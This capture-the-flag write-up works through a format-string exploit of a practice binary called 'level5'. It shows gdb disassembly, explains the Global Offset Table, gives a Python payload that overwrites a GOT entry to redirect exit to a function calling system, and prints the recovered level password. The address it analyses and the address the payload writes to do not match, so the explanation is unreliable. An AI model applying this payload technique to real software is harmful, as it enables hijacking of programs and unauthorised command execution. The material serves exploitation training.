# Level 5

after switch to the new level we found an exectubale file _level5_ we use gdb to disass.

```c
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:     push   ebp
   0x08048505 <+1>:     mov    ebp,esp
   0x08048507 <+3>:     and    esp,0xfffffff0
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave
   0x08048510 <+12>:    ret
End of assembler dump.
```

```c
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   ebp
   0x080484c3 <+1>:     mov    ebp,esp
   0x080484c5 <+3>:     sub    esp,0x218
   0x080484cb <+9>:     mov    eax,ds:0x8049848
   0x080484d0 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:    lea    eax,[ebp-0x208]
   0x080484e2 <+32>:    mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    eax,[ebp-0x208]
   0x080484f0 <+46>:    mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
```

```c
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x18
   0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```

we disass func in <+25>

```c
(gdb) disass 0x8048390
Dump of assembler code for function _exit@plt:
   0x08048390 <+0>:     jmp    *0x8049828
   0x08048396 <+6>:     push   $0x8
   0x0804839b <+11>:    jmp    0x8048370
End of assembler dump.
```

we notice in the exit function they jmp to \*0x8049828

```
(gdb) x/x 0x8049828
0x8049828 <_exit@got.plt>:      0x08048396
(gdb)
```

The Global Offset Table (GOT) is a data structure used in position-independent code (PIC) to provide a mechanism for resolving function calls and global variable references at runtime. The GOT is typically located in the data segment of a program and contains the memory addresses of all functions and global variables that are used in the program

```
(gdb) info func
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
-->  0x08048390  _exit
0x08048390  _exit@plt
```

so we change this address 0x8049828 to not let the program redirect to the exit func and redirect it to the func o().

```c
 python -c 'print("\x08\x04\x98\x38"[::-1] + "%x " * 2 + "%134513811x" + "%n")' > a
```

```c
cat .pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
